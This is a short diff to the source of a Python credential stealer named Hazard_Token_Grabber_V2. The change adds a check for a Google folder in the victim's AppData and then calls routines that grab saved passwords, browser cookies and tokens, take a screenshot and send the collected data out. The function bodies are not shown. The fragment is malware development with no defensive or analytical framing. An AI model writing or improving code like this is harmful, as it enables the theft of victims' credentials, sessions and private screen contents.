@@ -17,8 +17,11 @@ class Hazard_Token_Grabber_V2:
         self.tokens = []
         self.saved = []
 
-        self.grabPassword()
-        self.grabCookies()
+        if not os.path.exists(self.appdata+'\\Google'):
+            self.files += f"**{os.getlogin()}** doesn't have google installed"
+        else:
+            self.grabPassword()
+            self.grabCookies()
         self.grabTokens()
         self.screenshot()
         self.SendInfo()
